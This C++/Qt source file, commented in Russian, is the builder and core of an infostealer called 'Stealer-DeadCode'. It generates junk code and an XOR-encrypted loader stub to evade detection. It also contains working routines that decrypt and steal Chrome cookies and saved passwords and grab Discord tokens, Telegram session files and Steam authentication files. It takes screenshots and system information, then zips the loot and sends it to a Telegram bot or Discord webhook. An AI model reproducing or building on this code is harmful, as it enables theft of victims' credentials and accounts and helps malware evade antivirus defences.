    keyFile << "#endif // BUILD_KEY_H\n";
    keyFile.close();
    emitLog("Ключи сгенерированы в src/build_key.h");
}

// Генерация мусорного кода
std::string MainWindow::generateJunkCode() {
    emitLog("Генерация мусорного кода...");
    std::ofstream junkFile("src/junk_code.h");
    if (!junkFile.is_open()) {
        emitLog("Ошибка: Не удалось создать junk_code.h");
        isBuilding = false;
        return "";
    }

    junkFile << "#ifndef JUNK_CODE_H\n#define JUNK_CODE_H\n\n";
    junkFile << "#include <random>\n#include <string>\n#include <vector>\n#include <chrono>\n#include <thread>\n\n";
    junkFile << "inline int getRandomNumber(int min, int max) {\n";
    junkFile << "    static std::random_device rd;\n    static std::mt19937 gen(rd());\n";
    junkFile << "    std::uniform_int_distribution<> dis(min, max);\n    return dis(gen);\n}\n\n";
    junkFile << "namespace JunkCode {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(10, 20);
    int junkFuncCount = dis(gen);
    std::vector<std::string> junkFuncNames;
    for (int i = 0; i < junkFuncCount; ++i) {
        std::string funcName = "junkFunc_" + std::to_string(i) + "_" + std::to_string(dis(gen));
        junkFuncNames.push_back(funcName);
        junkFile << "    inline void " << funcName << "() {\n";
        junkFile << "        volatile int x = getRandomNumber(1000, 10000);\n";
        junkFile << "        volatile int y = getRandomNumber(500, 5000);\n";
        junkFile << "        std::vector<int> noise;\n";
        junkFile << "        for (int j = 0; j < getRandomNumber(5, 20); ++j) {\n";
        junkFile << "            noise.push_back(getRandomNumber(1, 100));\n";
        junkFile << "        }\n";
        junkFile << "        for (size_t k = 0; k < noise.size(); ++k) {\n";
        junkFile << "            if (noise[k] % 2 == 0) {\n";
        junkFile << "                x = (x ^ noise[k]) + y;\n";
        junkFile << "            } else {\n";
        junkFile << "                y = (y - noise[k]) ^ x;\n";
        junkFile << "            }\n";
        junkFile << "        }\n";
        junkFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 5)));\n";
        junkFile << "    }\n\n";
    }

    junkFile << "    inline void executeJunkCode() {\n";
    for (const auto& funcName : junkFuncNames) {
        junkFile << "        " << funcName << "();\n";
    }
    junkFile << "    }\n\n";
    junkFile << "} // namespace JunkCode\n\n#endif // JUNK_CODE_H\n";
    junkFile.close();
    emitLog("Мусорный код сгенерирован в src/junk_code.h");

    std::stringstream junkCode;
    junkCode << "#include \"junk_code.h\"\nvoid runJunkCode() {\n    JunkCode::executeJunkCode();\n}\n";
    return junkCode.str();
}

// Генерация случайного ключа
std::string MainWindow::generateRandomKey(size_t length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string key;
    key.reserve(length);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(charset) - 2);
    for (size_t i = 0; i < length; ++i) {
        key += charset[dis(gen)];
    }
    return key;
}

// Генерация stub-кода
std::string MainWindow::generateStubCode(const std::string& key) {
    emitLog("Генерация кода загрузчика (stub)...");
    std::stringstream stub;
    stub << "#include <windows.h>\n#include <string>\n#include <vector>\n\n";
    stub << "const std::string ENCRYPTION_KEY = \"" << key << "\";\n\n";
    stub << "void decryptData(std::vector<char>& data, const std::string& key) {\n";
    stub << "    for (size_t i = 0; i < data.size(); ++i) {\n";
    stub << "        data[i] ^= key[i % key.length()];\n";
    stub << "    }\n}\n\n";
    stub << "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n";
    stub << "    char exePath[MAX_PATH];\n    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n";
    stub << "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n";
    stub << "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n";
    stub << "    DWORD fileSize = GetFileSize(hFile, NULL);\n    std::vector<char> fileData(fileSize);\n";
    stub << "    DWORD bytesRead;\n    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);\n    CloseHandle(hFile);\n";
    stub << "    size_t stubSize = 4096;\n    std::vector<char> encryptedData(fileData.begin() + stubSize, fileData.end());\n";
    stub << "    decryptData(encryptedData, ENCRYPTION_KEY);\n";
    stub << "    char tempPath[MAX_PATH];\n    GetTempPathA(MAX_PATH, tempPath);\n";
    stub << "    std::string tempFilePath = std::string(tempPath) + \"temp_build.exe\";\n";
    stub << "    HANDLE hTempFile = CreateFileA(tempFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
    stub << "    if (hTempFile == INVALID_HANDLE_VALUE) return 1;\n";
    stub << "    DWORD bytesWritten;\n    WriteFile(hTempFile, encryptedData.data(), encryptedData.size(), &bytesWritten, NULL);\n";
    stub << "    CloseHandle(hTempFile);\n";
    stub << "    STARTUPINFOA si = { sizeof(si) };\n    PROCESS_INFORMATION pi;\n";
    stub << "    if (CreateProcessA(tempFilePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n";
    stub << "        WaitForSingleObject(pi.hProcess, INFINITE);\n        CloseHandle(pi.hProcess);\n        CloseHandle(pi.hThread);\n";
    stub << "    }\n    DeleteFileA(tempFilePath.c_str());\n    return 0;\n}\n";

    std::ofstream stubFile("stub.cpp");
    if (!stubFile.is_open()) {
        emitLog("Ошибка: Не удалось создать stub.cpp");
        return "";
    }
    stubFile << stub.str();
    stubFile.close();

    std::string stubExePath = "stub.exe";
    std::string compileCommand = "g++ stub.cpp -o " + stubExePath + " -mwindows";
    if (system(compileCommand.c_str()) != 0) {
        emitLog("Ошибка: Не удалось скомпилировать stub");
        return "";
    }

    std::ifstream stubExeFile(stubExePath, std::ios::binary);
    if (!stubExeFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть скомпилированный stub");
        return "";
    }
    std::vector<char> stubData((std::istreambuf_iterator<char>(stubExeFile)), std::istreambuf_iterator<char>());
    stubExeFile.close();

    std::filesystem::remove("stub.cpp");
    std::filesystem::remove(stubExePath);

    emitLog("Stub успешно сгенерирован");
    return std::string(stubData.begin(), stubData.end());
}

// Шифрование билда
bool MainWindow::encryptBuild(const std::string& buildPath, const std::string& key) {
    emitLog("Шифрование билда: " + QString::fromStdString(buildPath));
    std::ifstream inFile(buildPath, std::ios::binary);
    if (!inFile) {
        emitLog("Ошибка: Не удалось открыть билд для чтения");
        return false;
    }
    std::vector<char> buildData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    std::vector<char> encryptedData = buildData;
    for (size_t i = 0; i < encryptedData.size(); ++i) {
        encryptedData[i] ^= key[i % key.length()];
    }

    std::string stubCode = generateStubCode(key);
    if (stubCode.empty()) {
        emitLog("Ошибка: Не удалось сгенерировать stub");
        return false;
    }

    std::string encryptedBuildPath = buildPath + ".encrypted.exe";
    std::ofstream outFile(encryptedBuildPath, std::ios::binary);
    if (!outFile) {
        emitLog("Ошибка: Не удалось создать зашифрованный билд");
        return false;
    }
    outFile.write(stubCode.c_str(), stubCode.size());
    outFile.write(encryptedData.data(), encryptedData.size());
    outFile.close();

    std::filesystem::remove(buildPath);
    std::filesystem::rename(encryptedBuildPath, buildPath);

    emitLog("Билд успешно зашифрован");
    return true;
}

// Компиляция билда
bool MainWindow::compileBuild(const std::string& polymorphicCode, const std::string& junkCode) {
    emitLog("Компиляция билда...");
    std::filesystem::create_directories("builds");

    std::string sourceCode = "#include \"build_key.h\"\n#include \"mainwindow.h\"\n";
    sourceCode += polymorphicCode + "\n" + junkCode + "\n";
    sourceCode += R"(
        int main() {
            runPolymorphicCode();
            runJunkCode();
            MainWindow window;
            window.StealAndSendData("temp");
            return 0;
        }
    )";

    std::string sourcePath = "builds/temp_source.cpp";
    std::ofstream sourceFile(sourcePath);
    if (!sourceFile) {
        emitLog("Ошибка: Не удалось создать исходный файл");
        return false;
    }
    sourceFile << sourceCode;
    sourceFile.close();

    std::string buildPath = "builds/" + config.filename;
    std::string compileCommand = "g++ \"" + sourcePath + "\" -o \"" + buildPath + "\" -mwindows -lbcrypt -lshlwapi -liphlpapi -lpsapi -luser32 -lwininet -ladvapi32 -lws2_32 -lcrypt32 -lzip -lsqlite3 -lcurl -lssl -lcrypto";
    if (!config.iconPath.empty()) {
        compileCommand += " -I. -L. -I./include -L./lib \"" + config.iconPath + "\"";
    } else {
        compileCommand += " -I. -L. -I./include -L./lib";
    }

    if (system(compileCommand.c_str()) != 0) {
        emitLog("Ошибка компиляции билда");
        return false;
    }

    emitLog("Билд успешно скомпилирован: " + QString::fromStdString(buildPath));
    return true;
}

// Создание ZIP-архива (потокобезопасно)
std::string MainWindow::archiveData(const std::string& dir, const std::vector<std::string>& files) {
    emitLog("Создание ZIP-архива в: " + QString::fromStdString(dir));
    if (files.empty()) {
        emitLog("Ошибка: Список файлов пуст");
        return "";
    }

    std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
    int err = 0;
    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString::number(err));
        return "";
    }

    bool hasFiles = false;
    for (const auto& filePath : files) {
        if (!std::filesystem::exists(filePath)) {
            emitLog("Файл не найден: " + QString::fromStdString(filePath));
            continue;
        }
        zip_source_t* source = zip_source_file_create(filePath.c_str(), 0, -1, &err);
        if (!source) {
            emitLog("Ошибка создания источника для " + QString::fromStdString(filePath) + ": " + QString::number(err));
            continue;
        }
        std::string fileName = std::filesystem::path(filePath).filename().string();
        if (zip_file_add(zip, fileName.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
            emitLog("Ошибка добавления " + QString::fromStdString(fileName));
            zip_source_free(source);
            continue;
        }
        hasFiles = true;
    }

    if (!hasFiles) {
        emitLog("Ошибка: Нет файлов для архива");
        zip_discard(zip);
        return "";
    }

    if (zip_close(zip) < 0) {
        emitLog("Ошибка закрытия ZIP: " + QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
        return "";
    }

    emitLog("ZIP-архив создан: " + QString::fromStdString(zipPath));
    return zipPath;
}

// Шифрование данных (уже с автоматической генерацией ключей)
std::string MainWindow::encryptData(const std::string& data) {
    emitLog("Шифрование данных...");

    if (encryptionKey1.empty() || encryptionKey2.empty() || encryptionSalt.empty()) {
        generateEncryptionKeys(); // Автоматическая генерация ключей
    }

    std::array<unsigned char, 16> key1 = GetEncryptionKey(true);
    std::array<unsigned char, 16> key2 = GetEncryptionKey(false);
    std::array<unsigned char, 16> iv = generateIV();

    QByteArray dataByteArray(data.c_str(), data.size());
    QByteArray xorData = applyXOR(dataByteArray, key1);
    QByteArray aesData = applyAES(xorData, key2, iv);
    if (aesData.isEmpty()) {
        emitLog("Не удалось зашифровать данные с помощью AES");
        return "";
    }

    std::string result;
    result.append(reinterpret_cast<const char*>(iv.data()), iv.size());
    result.append(aesData.constData(), aesData.size());

    emitLog("Данные зашифрованы, размер: " + QString::number(result.size()).toStdString());
    return result;
}

// Отправка данных через Telegram
void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::string>& files) {
    emitLog("Отправка данных через Telegram...");

    if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
        emitLog("Ошибка: Токен Telegram или Chat ID не указаны");
        return;
    }

    std::string tempDir = "temp_" + generateRandomString(8);
    std::filesystem::create_directories(tempDir);
    std::string zipPath = archiveData(tempDir, files);
    if (zipPath.empty()) {
        emitLog("Ошибка: Не удалось создать ZIP для Telegram");
        std::filesystem::remove_all(tempDir);
        return;
    }

    std::uintmax_t fileSize = std::filesystem::file_size(zipPath);
    const std::uintmax_t telegramFileSizeLimit = 50 * 1024 * 1024; // 50 МБ
    if (fileSize > telegramFileSizeLimit) {
        emitLog("Ошибка: ZIP (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Telegram (50 МБ)");
        std::filesystem::remove_all(tempDir);
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL");
        std::filesystem::remove_all(tempDir);
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part;

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "chat_id");
    curl_mime_data(part, config.telegramChatId.c_str(), CURL_ZERO_TERMINATED);

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "document");
    curl_mime_filedata(part, zipPath.c_str());

    std::string response;
    std::string url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendDocument";
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
        if (doc.isNull() || !doc.object().value("ok").toBool()) {
            emitLog("Ошибка API Telegram: " + QString::fromStdString(response));
        } else {
            emitLog("Данные отправлены через Telegram");
        }
    }

    curl_mime_free(mime);
    curl_easy_cleanup(curl);
    std::filesystem::remove_all(tempDir);
}

// Отправка данных через Discord
void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::string>& files) {
    emitLog("Отправка данных через Discord...");

    if (config.discordWebhook.empty()) {
        emitLog("Ошибка: Webhook Discord не указан");
        return;
    }

    std::string tempDir = "temp_" + generateRandomString(8);
    std::filesystem::create_directories(tempDir);
    std::string zipPath = archiveData(tempDir, files);
    if (zipPath.empty()) {
        emitLog("Ошибка: Не удалось создать ZIP для Discord");
        std::filesystem::remove_all(tempDir);
        return;
    }

    std::uintmax_t fileSize = std::filesystem::file_size(zipPath);
    const std::uintmax_t discordFileSizeLimit = 25 * 1024 * 1024; // 25 МБ
    if (fileSize > discordFileSizeLimit) {
        emitLog("Ошибка: ZIP (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Discord (25 МБ)");
        std::filesystem::remove_all(tempDir);
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL");
        std::filesystem::remove_all(tempDir);
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, zipPath.c_str());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка Discord: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        if (response.find("id") == std::string::npos) {
            emitLog("Ошибка Webhook Discord: " + QString::fromStdString(response));
        } else {
            emitLog("Данные отправлены через Discord");
        }
    }

    curl_mime_free(mime);
    curl_easy_cleanup(curl);
    std::filesystem::remove_all(tempDir);
}

// Сохранение данных локально
void MainWindow::saveToLocalFile(const std::string& data, const std::string& dir) {
    emitLog("Сохранение данных локально в: " + QString::fromStdString(dir));

    std::string outputDir = dir + "\\output";
    std::filesystem::create_directories(outputDir);
    std::string destPath = outputDir + "\\stolen_data_" + generateRandomString(8) + ".bin";

    std::ofstream outFile(destPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось сохранить данные: " + QString::fromStdString(destPath));
        return;
    }

    outFile.write(data.data(), data.size());
    outFile.close();
    emitLog("Данные сохранены: " + QString::fromStdString(destPath));
}

// Отправка данных
void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
    std::string data = encryptedData.toStdString();
    if (config.sendMethod == "Telegram") {
        sendToTelegram(data, files);
    } else if (config.sendMethod == "Discord") {
        sendToDiscord(data, files);
    } else {
        saveToLocalFile(data, "output");
    }
}

// Сбор системной информации
std::string MainWindow::collectSystemInfo(const std::string& dir) {
    emitLog("Сбор системной информации...");

    std::string sysDir = dir + "\\SystemInfo";
    std::filesystem::create_directories(sysDir);
    std::string sysInfoPath = sysDir + "\\system_info.txt";
    std::ofstream outFile(sysInfoPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для системной информации");
        return "";
    }

    outFile << "Hostname: " << QHostInfo::localHostName().toStdString() << "\n";
    outFile << "OS: " << QSysInfo::prettyProductName().toStdString() << "\n";
    outFile << "OS Version: " << QSysInfo::productVersion().toStdString() << "\n";
    outFile << "Architecture: " << QSysInfo::currentCpuArchitecture().toStdString() << "\n";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char cpuName[1024];
        DWORD size = sizeof(cpuName);
        if (RegQueryValueExA(hKey, "ProcessorNameString", nullptr, nullptr, (LPBYTE)cpuName, &size) == ERROR_SUCCESS) {
            outFile << "CPU: " << cpuName << "\n";
        }
        RegCloseKey(hKey);
    }

    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        outFile << "Total Physical Memory: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB\n";
        outFile << "Available Physical Memory: " << (memInfo.ullAvailPhys / (1024 * 1024)) << " MB\n";
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = (PIP_ADAPTER_INFO)buffer.data();
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        PIP_ADAPTER_INFO adapter = adapterInfo;
        while (adapter) {
            outFile << "Network Adapter: " << adapter->Description << "\n";
            outFile << "MAC Address: ";
            for (int i = 0; i < (int)adapter->AddressLength; ++i) {
                outFile << std::hex << std::setw(2) << std::setfill('0') << (int)adapter->Address[i];
                if (i < (int)adapter->AddressLength - 1) outFile << "-";
            }
            outFile << "\n";
            outFile << "IP Address: " << adapter->IpAddressList.IpAddress.String << "\n\n";
            adapter = adapter->Next;
        }
    }

    outFile.close();
    emitLog("Системная информация сохранена: " + QString::fromStdString(sysInfoPath));
    QMutexLocker locker(&filesMutex);
    collectedFiles.push_back(sysInfoPath);
    return sysInfoPath;
}

// Создание скриншота
std::string MainWindow::TakeScreenshot(const std::string& dir) {
    emitLog("Создание скриншота...");

    std::string screenshotDir = dir + "\\Screenshots";
    std::filesystem::create_directories(screenshotDir);
    QScreen* screen = QGuiApplication::primaryScreen();
    if (!screen) {
        emitLog("Ошибка: Не удалось получить доступ к экрану");
        return "";
    }

    QPixmap originalPixmap = screen->grabWindow(0);
    if (originalPixmap.isNull()) {
        emitLog("Ошибка: Не удалось сделать скриншот");
        return "";
    }

    QPainter painter(&originalPixmap);
    QFont font("Arial", 30, QFont::Bold);
    painter.setFont(font);
    painter.setPen(Qt::red);
    QString text = "Stealer-DeadCode";
    QFontMetrics fontMetrics(font);
    QRect textRect = fontMetrics.boundingRect(text);
    int x = (originalPixmap.width() - textRect.width()) / 2;
    int y = (originalPixmap.height() - textRect.height()) / 2;
    painter.drawText(x, y, text);

    std::string screenshotPath = screenshotDir + "\\screenshot_" + generateRandomString(8) + ".png";
    if (!originalPixmap.save(QString::fromStdString(screenshotPath), "PNG")) {
        emitLog("Ошибка: Не удалось сохранить скриншот");
        return "";
    }

    emitLog("Скриншот сохранён: " + QString::fromStdString(screenshotPath));
    QMutexLocker locker(&filesMutex);
    collectedFiles.push_back(screenshotPath);
    return screenshotPath;
}

// Кража данных браузера
std::string MainWindow::stealBrowserData(const std::string& dir) {
    emitLog("Начало кражи данных браузера...");

    std::string browserDir = dir + "\\BrowserData";
    std::filesystem::create_directories(browserDir);
    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        emitLog("Ошибка: Не удалось получить LOCALAPPDATA");
        free(localAppDataPath);
        return "";
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string chromePath = localAppData + "\\Google\\Chrome\\User Data\\Default";
    if (std::filesystem::exists(chromePath)) {
        emitLog("Обнаружен Google Chrome...");

        if (config.cookies) {
            std::string cookiesPath = chromePath + "\\Network\\Cookies";
            if (std::filesystem::exists(cookiesPath)) {
                std::string destCookiesPath = browserDir + "\\chrome_cookies.sqlite";
                std::filesystem::copy_file(cookiesPath, destCookiesPath, std::filesystem::copy_options::overwrite_existing);

                sqlite3* db;
                if (sqlite3_open(destCookiesPath.c_str(), &db) == SQLITE_OK) {
                    std::string cookiesDataPath = browserDir + "\\chrome_cookies.txt";
                    std::ofstream cookiesFile(cookiesDataPath);
                    if (cookiesFile.is_open()) {
                        sqlite3_stmt* stmt;
                        const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
                        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                QByteArray encryptedValue((const char*)sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2));
                                QByteArray decryptedValue = decryptDPAPIData(encryptedValue);
                                if (!decryptedValue.isEmpty()) {
                                    cookiesFile << "Host: " << host << "\n";
                                    cookiesFile << "Name: " << name << "\n";
                                    cookiesFile << "Value: " << decryptedValue.toStdString() << "\n\n";
                                }
                            }
                            sqlite3_finalize(stmt);
                        }
                        cookiesFile.close();
                        emitLog("Куки Chrome извлечены: " + QString::fromStdString(cookiesDataPath));
                        QMutexLocker locker(&filesMutex);
                        collectedFiles.push_back(cookiesDataPath);
                        result += "Chrome Cookies: " + cookiesDataPath + "\n";
                    }
                    sqlite3_close(db);
                }
            }
        }

        if (config.passwords) {
            std::string passwordsPath = chromePath + "\\Login Data";
            if (std::filesystem::exists(passwordsPath)) {
                std::string destPasswordsPath = browserDir + "\\chrome_logins.sqlite";
                std::filesystem::copy_file(passwordsPath, destPasswordsPath, std::filesystem::copy_options::overwrite_existing);

                sqlite3* db;
                if (sqlite3_open(destPasswordsPath.c_str(), &db) == SQLITE_OK) {
                    std::string passwordsDataPath = browserDir + "\\chrome_passwords.txt";
                    std::ofstream passwordsFile(passwordsDataPath);
                    if (passwordsFile.is_open()) {
                        sqlite3_stmt* stmt;
                        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
                        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                QByteArray encryptedPassword((const char*)sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2));
                                QByteArray decryptedPassword = decryptDPAPIData(encryptedPassword);
                                if (!decryptedPassword.isEmpty()) {
                                    passwordsFile << "URL: " << url << "\n";
                                    passwordsFile << "Username: " << username << "\n";
                                    passwordsFile << "Password: " << decryptedPassword.toStdString() << "\n\n";
                                }
                            }
                            sqlite3_finalize(stmt);
                        }
                        passwordsFile.close();
                        emitLog("Пароли Chrome извлечены: " + QString::fromStdString(passwordsDataPath));
                        QMutexLocker locker(&filesMutex);
                        collectedFiles.push_back(passwordsDataPath);
                        result += "Chrome Passwords: " + passwordsDataPath + "\n";
                    }
                    sqlite3_close(db);
                }
            }
        }
    }
    emitLog("Кража данных браузера завершена");
    return result;
}

// Кража токенов Discord
std::string MainWindow::StealDiscordTokens(const std::string& dir) {
    emitLog("Начало кражи токенов Discord...");

    std::string discordDir = dir + "\\DiscordData";
    std::filesystem::create_directories(discordDir);

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить APPDATA");
        free(appDataPath);
        return "";
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::vector<std::string> discordPaths = {
        appData + "\\discord\\Local Storage\\leveldb\\",
        appData + "\\DiscordCanary\\Local Storage\\leveldb\\",
        appData + "\\DiscordPTB\\Local Storage\\leveldb\\"
    };

    std::string tokensPath = discordDir + "\\discord_tokens.txt";
    std::ofstream outFile(tokensPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл токенов Discord");
        return "";
    }

    std::string tokenData;
    std::regex tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
    std::set<std::string> uniqueTokens;

    for (const auto& path : discordPaths) {
        if (!std::filesystem::exists(path)) continue;
        for (const auto& entry : std::filesystem::directory_iterator(path)) {
            if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) continue;
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    std::string token = match[0].str();
                    if (uniqueTokens.insert(token).second) {
                        tokenData += "Token: " + token + "\n";
                    }
                    searchStart = match.suffix().first;
                }
            }
        }
    }

    if (!tokenData.empty()) {
        outFile << tokenData;
        outFile.close();
        QMutexLocker locker(&filesMutex);
        collectedFiles.push_back(tokensPath);
        emitLog("Токены Discord сохранены: " + QString::fromStdString(tokensPath));
        return tokenData;
    } else {
        outFile.close();
        std::filesystem::remove(tokensPath);
        emitLog("Токены Discord не найдены");
        return "";
    }
}

// Кража данных Telegram
std::string MainWindow::StealTelegramData(const std::string& dir) {
    emitLog("Начало кражи данных Telegram...");

    std::string telegramDir = dir + "\\TelegramData";
    std::filesystem::create_directories(telegramDir);

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить APPDATA");
        free(appDataPath);
        return "";
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (!std::filesystem::exists(telegramPath)) {
        emitLog("Директория Telegram не найдена");
        return "";
    }

    std::string result;
    for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
        std::string filename = entry.path().filename().string();
        if (filename.find("key_data") != std::string::npos || filename.find("D877F783D5D3EF8C") != std::string::npos) {
            std::string destFilePath = telegramDir + "\\" + filename;
            std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
            QMutexLocker locker(&filesMutex);
            collectedFiles.push_back(destFilePath);
            result += "Telegram File: " + destFilePath + "\n";
        }
    }
    emitLog("Данные Telegram скопированы: " + QString::fromStdString(telegramDir));
    return result;
}

// Кража данных Steam
std::string MainWindow::StealSteamData(const std::string& dir) {
    emitLog("Начало кражи данных Steam...");

    std::string steamDir = dir + "\\SteamData";
    std::filesystem::create_directories(steamDir);
    std::string result;

    HKEY hKey;
    std::string steamPath;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            steamPath = std::string(buffer);
        }
        RegCloseKey(hKey);
    }

    if (steamPath.empty()) {
        emitLog("Ошибка: Не удалось определить путь к Steam");
        return "";
    }

    std::string configPath = steamPath + "\\config";
    std::string ssfnPath;
    for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
        if (entry.path().filename().string().find("ssfn") != std::string::npos) {
            ssfnPath = entry.path().string();
            break;
        }
    }

    if (std::filesystem::exists(configPath + "\\config.vdf")) {
        std::string destConfigPath = steamDir + "\\config.vdf";
        std::filesystem::copy_file(configPath + "\\config.vdf", destConfigPath, std::filesystem::copy_options::overwrite_existing);
        QMutexLocker locker(&filesMutex);
        collectedFiles.push_back(destConfigPath);
        result += "Config: " + destConfigPath + "\n";
    }

    if (!ssfnPath.empty() && std::filesystem::exists(ssfnPath)) {
        std::string destSsfnPath = steamDir + "\\" + std::filesystem::path(ssfnPath).filename().string();
        std::filesystem::copy_file(ssfnPath, destSsfnPath, std::filesystem::copy_options::overwrite_existing);
        QMutexLocker locker(&filesMutex);
        collectedFiles.push_back(destSsfnPath);
        result += "SSFN: " + destSsfnPath + "\n";
    }

    if (config.steamMAFile) {
        std::string maFilesPath = steamPath + "\\steamapps\\common\\Steam Mobile\\maFiles";
        if (std::filesystem::exists(maFilesPath)) {
            std::string destMaFilesDir = steamDir + "\\maFiles";
            std::filesystem::create_directories(destMaFilesDir);
            for (const auto& entry : std::filesystem::directory_iterator(maFilesPath)) {
                if (entry.path().extension() == ".maFile") {
                    std::string destFilePath = destMaFilesDir + "\\" + entry.path().filename().string();
                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                    QMutexLocker locker(&filesMutex);
                    collectedFiles.push_back(destFilePath);
                    result += "MAFile: " + destFilePath + "\n";
                }
            }
        }
    }
    emitLog("Кража данных Steam завершена");
    return result;
}

